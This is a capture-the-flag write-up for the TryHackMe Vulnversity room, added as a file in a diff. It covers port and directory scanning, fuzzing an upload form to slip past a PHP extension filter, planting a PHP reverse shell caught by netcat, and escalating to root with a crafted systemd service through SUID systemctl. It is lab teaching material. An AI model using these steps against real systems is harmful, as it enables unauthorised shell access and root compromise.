@@ -1,0 +1,102 @@
+#+TITLE: TryHackMe - Vulnversity writeup
+
+https://tryhackme.com/room/vulnversity
+
+* Reconnaissance
+
+	*nmap scan:*
+
+	#+begin_src shell
+		nmap -p- -T4 -vv -Pn 10.10.10.10
+		nmap -sV -vv -Pn -p 21,22,139,445,3128,3333 10.10.10.10
+	#+end_src
+
+* Compromising the website
+
+	*Scanning the website found:*
+
+	#+begin_src shell
+		gobuster dir -u http://10.10.230.97:3333 -w /usr/share/wordlists/dirb/common.txt
+		gobuster dir -u http://10.10.230.97:3333/internal -w /usr/share/wordlists/dirb/common.txt
+	#+end_src
+
+	`gobuster` reveals an '/internal' page with an upload form.
+
+	A quick test determines that the form does not allow upload of '.php' files.
+
+	[[/home/jb/Projects/hacking/tryhackme/images/vulnversity1.png]]
+
+** Fuzzing the upload form
+
+	 #+begin_quote
+	 Fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program
+	 - Wikipedia
+	 #+end_quote
+
+	 Let's attempt to upload a 'test.php' file with a different extension.
+
+	 To find out which extensions are allowed, we're going to fuzz the upload form. This can be accomplished using BurpSuite's Intruder.
+
+	 1. Use the form to upload './test.php'
+	 2. Intercept the request via BurpSuite's Proxy and send it to Intruder: *Actions -> Send to Intruder*
+	 3. Under Intruder's tab *Positions*, select *Attack Type -> Sniper*
+	 4. Under Intruder's tab *Positions*, in the Payload, *set 'filename' to 'php-reverse-shell§.php§'*
+
+	 [[/home/jb/Projects/hacking/tryhackme/images/vulnversity2.png]]
+
+	 Under Intruder's tab *Payloads*,
+
+	 1. In *Payload Options [Simple List]*, load file '/usr/share/wordlists/wfuzz/general/extensions_common.txt'
+	 2. In *Payload Encoding*, uncheck "URL-encore these characters"
+	 3. Start the attack
+
+	 [[/home/jb/Projects/hacking/tryhackme/images/vulnversity3.png]]
+
+	 On the Intruder *attack window*, sort requests by 'Length': the different one(s) will likely indicate successful upload, hence identifying the allowed extension(s).
+
+	 In this case, it is '.phtml' (response's length is 723, while all others are 737).
+
+	 [[/home/jb/Projects/hacking/tryhackme/images/vulnversity4.png]]
+
+	 *Let's check http://10.10.230.97:3333/internal/uploads/: test.phtml is there!*
+
+** PHP reverse shell as payload
+
+	 'php-reverse-shell.php' can be found in ''/usr/share/webshells/php/' in Kali, otherwise can be downloaded.
+
+	 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+	 1. Start netcat to listen to incoming connections: `nc -lnvp 4444`
+	 2. Copy the 'php-reverse-shell.php' file into your working directory, edit the file and replace 'ip' and 'port' variables with your attack box IP and the port netcat is listening to
+	 3. Rename the file to 'php-reverse-shell.phtml'
+	 4. Upload the file and navigate to http://10.10.230.97:3333/internal/uploads/php-reverse-shell.php
+	 5. netcat should receive the shell!
+
+* User flag
+
+	The user flag is in '/home/bill/user.text'.
+
+* Privilege Escalation
+
+	Finding all SUID files on the system.
+
+	#+begin_src shell
+		find / -user root -perm -4000 -exec ls -ldb {} \;
+	#+end_src
+
+	The file of interest is *`/bin/systemctl`*. GTFOBins has a page about it.
+
+	https://gtfobins.github.io/gtfobins/systemctl/
+
+	#+begin_src shell
+		TF=$(mktemp).service
+		echo '[Service]
+		Type=oneshot
+		ExecStart=/bin/sh -c "cat /root/root.xt > /tmp/output"
+		[Install]
+		WantedBy=multi-user.target' > $TF
+		/bin/systemctl link $TF
+		/bin/systemctl enable --now $TF
+	#+end_src
+
+	The root flag will be outputed to file '/tmp/output.'
